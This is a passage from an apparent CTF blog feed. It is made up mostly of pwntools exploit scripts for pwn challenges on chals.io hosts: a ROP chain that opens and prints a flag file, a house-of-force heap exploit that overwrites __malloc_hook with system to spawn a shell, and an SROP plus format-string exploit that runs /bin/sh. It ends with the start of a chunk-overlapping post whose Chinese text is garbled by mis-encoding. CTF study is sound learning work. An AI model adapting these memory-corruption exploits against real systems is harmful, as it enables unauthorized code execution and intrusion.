</span><span class="n">pay1</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_addr</span><span class="o">+</span><span class="mh">0x500</span><span class="o">+</span><span class="mh">0x20</span><span class="p">)</span> 
<span class="n">pay1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stdin_off</span><span class="p">)</span> 
<span class="n">pay1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">)</span>
<span class="n">pay1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span>

<span class="n">sla</span><span class="p">(</span><span class="s">'Now I am the master &gt;&gt;&gt; '</span><span class="p">,</span> <span class="n">pay1</span><span class="p">)</span>
<span class="n">stdin_got</span> <span class="o">=</span> <span class="n">uu64</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\x7f</span><span class="s">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:])</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'stdin_got '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stdin_got</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'pay= '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">pay1</span><span class="p">))</span>

<span class="c1"># read sith.txt to bss
</span><span class="n">pay2</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_addr</span><span class="o">+</span><span class="mh">0x500</span><span class="o">+</span><span class="mh">0x20</span><span class="p">)</span>
<span class="n">pay2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_addr</span><span class="o">+</span><span class="mh">0x600</span><span class="p">)</span> 
<span class="n">pay2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">pay2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stdin_got</span><span class="p">)</span>
<span class="n">pay2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fgets_addr</span><span class="p">)</span>

<span class="c1"># open sith.txt
</span><span class="n">pay2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_addr</span><span class="o">+</span><span class="mh">0x600</span><span class="p">)</span> 
<span class="n">pay2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">r_mode_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">pay2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fopen_addr</span><span class="p">)</span>

<span class="c1"># read sith.txt and print flag
</span><span class="n">pay2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rbp</span><span class="p">)</span>
<span class="n">pay2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_addr</span><span class="o">+</span><span class="mh">0x800</span><span class="o">+</span><span class="mh">0x30</span><span class="p">)</span>
<span class="n">pay2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40155E</span><span class="p">)</span>

<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'len(pay2) '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">pay2</span><span class="p">)))</span>
<span class="n">sla</span><span class="p">(</span><span class="s">'Now I am the master &gt;&gt;&gt; '</span><span class="p">,</span> <span class="n">pay2</span><span class="p">)</span>

<span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s">'sith.txt</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">rls</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>

<span class="c1"># mark, learn orw
</span></code></pre></div></div>

<h2 id="use-the-force-luke">Use the Force, Luke</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./force'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="n">libc_path</span> <span class="o">=</span> <span class="s">'./.glibc/glibc_2.28_no-tcache/libc.so.6'</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_path</span><span class="p">)</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'0.cloud.chals.io'</span><span class="p">,</span> <span class="mi">11996</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
        <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
        <span class="n">pause</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">cont</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">'(2) Surrender</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">'How many midi-chlorians?: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
        <span class="n">sa</span><span class="p">(</span><span class="s">'What do you feel?: '</span><span class="p">,</span> <span class="n">cont</span><span class="p">)</span>

<span class="n">ru</span><span class="p">(</span><span class="s">'You feel a system at '</span><span class="p">)</span>
<span class="n">system_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">ru</span><span class="p">(</span><span class="s">'You feel something else at '</span><span class="p">)</span>
<span class="n">chunk0_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>

<span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">system_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__malloc_hook'</span><span class="p">]</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'system addr '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'chunk0 addr '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">chunk0_addr</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'malloc hook '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">malloc_hook</span><span class="p">))</span>
<span class="c1"># dbg()
</span>
<span class="c1"># overwrite the top chunk to a huge size
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x90</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x98</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">))</span>
<span class="c1"># dbg()
</span>
<span class="c1"># move the top chunk
</span><span class="n">fake_size</span> <span class="o">=</span> <span class="n">malloc_hook</span> <span class="o">-</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="p">(</span><span class="n">chunk0_addr</span> <span class="o">+</span> <span class="mh">0x90</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10</span>
<span class="n">add</span><span class="p">(</span><span class="n">fake_size</span><span class="p">,</span> <span class="sa">b</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
<span class="c1"># dbg()
</span>
<span class="c1"># overwrite the malloc_hook to system
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
<span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">chunk0_addr</span> <span class="o">+</span> <span class="mh">0x90</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="mh">0x10</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'binsh_addr '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">))</span>
<span class="c1"># dbg()
</span>
<span class="c1"># send the address of binsh
</span><span class="n">add</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">,</span> <span class="sa">b</span><span class="s">'cat flag.txt</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
<span class="c1"># dbg()
</span>
<span class="n">itr</span><span class="p">()</span>

<span class="c1"># mark, learn house of force
</span></code></pre></div></div>

<h2 id="blackhole-rop">Blackhole ROP</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="c1"># context.log_level = 'debug'
</span><span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'0.cloud.chals.io'</span><span class="p">,</span> <span class="mi">12655</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">ret2libc</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="s">''</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="s">''</span><span class="p">:</span>
                <span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">leak_addr</span><span class="p">)</span>
                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'system'</span><span class="p">)</span>
                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'str_bin_sh'</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
                <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="n">pattern</span><span class="p">]</span>
                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))</span>

        <span class="k">return</span> <span class="n">system</span><span class="p">,</span> <span class="n">binsh</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
        <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
        <span class="n">pause</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">write_to_writeable</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
                <span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'%'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">])).</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'c%8$n'</span>
                <span class="n">pay</span> <span class="o">=</span> <span class="n">pay</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
                <span class="n">sl</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'You say:'</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)))</span>
        <span class="n">sa</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'4'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="n">ru</span><span class="p">(</span><span class="s">'Address of syscall, ret    : '</span><span class="p">)</span>
<span class="n">syscall</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">ru</span><span class="p">(</span><span class="s">'Address of writable memory : '</span><span class="p">)</span>
<span class="n">bss</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">ru</span><span class="p">(</span><span class="s">'Address of pop rax, ret    : '</span><span class="p">)</span>
<span class="n">rax</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>

<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'syscall '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">syscall</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'bss '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">bss</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'rax ret'</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">rax</span><span class="p">))</span>

<span class="c1"># write binsh to a writeable address
</span><span class="n">write_to_writeable</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">,</span> <span class="n">bss</span><span class="p">)</span>

<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'%8$s'</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'----'</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span>
<span class="n">sl</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">rls</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>

<span class="c1"># srop
</span><span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mi">59</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">bss</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span>

<span class="c1"># padding is 0x28
</span><span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="mh">0x28</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xf</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
<span class="n">sl</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>

<span class="n">ru</span><span class="p">(</span><span class="s">'@'</span><span class="p">)</span>
<span class="n">sl</span><span class="p">(</span><span class="s">'cat flag.txt'</span><span class="p">)</span>
<span class="n">itr</span><span class="p">()</span>

<span class="c1"># mark, learn brop, srop and fmt
</span></code></pre></div></div>]]></content><author><name>dayfly</name></author><category term="pwn" /><category term="fmt" /><category term="orw" /><category term="brop" /><category term="srop" /><category term="house of force" /><category term="set" /><summary type="html"><![CDATA[Vader]]></summary></entry><entry><title type="html">Chunk overlapping ÊÄªÁªì</title><link href="http://localhost:4000/pwn/2022/03/28/chunk-overlapping-%E6%80%BB%E7%BB%93.html" rel="alternate" type="text/html" title="Chunk overlapping ÊÄªÁªì" /><published>2022-03-28T00:00:00+08:00</published><updated>2022-03-28T00:00:00+08:00</updated><id>http://localhost:4000/pwn/2022/03/28/chunk-overlapping-%E6%80%BB%E7%BB%93</id><content type="html" xml:base="http://localhost:4000/pwn/2022/03/28/chunk-overlapping-%E6%80%BB%E7%BB%93.html"><![CDATA[<h2 id="off-by-one">Off By One</h2>

<p>ÈÄöÂ∏∏ÁöÑÂà©Áî®ÊÄùË∑ØÊòØË¶ÜÁõñË¢´Ê∫¢Âá∫Â†ÜÂùóÁöÑ‰∏ã‰∏Ä‰∏™Â†ÜÂùó<code class="language-plaintext highlighter-rouge">size</code>ÂüüÁöÑÊúÄ‰Ωé‰∏ÄÂ≠óËäÇÔºåÂèØ‰ª•Êâ©Â±ïÂ†ÜÂùóÔºå‰πüÂèØ‰ª•Áº©ÂáèÂ†ÜÂùóÔºåÂè™ÊòØÂêéËÄÖÂØπÊï∞ÊçÆÊûÑÈÄ†ÁöÑË¶ÅÊ±ÇÊõ¥È´ò‰∏Ä‰∫õ</p>

<h3 id="ÂêéÂêëÊâ©Â±ï">ÂêéÂêëÊâ©Â±ï</h3>

<ul>
  <li>ËøôÈáåÁß∞Ë¢´Ê∫¢Âá∫Â†ÜÂùóÁöÑ‰∏ã‰∏Ä‰∏™Â†ÜÂùó‰∏∫<strong>target</strong>Â†ÜÂùó</li>
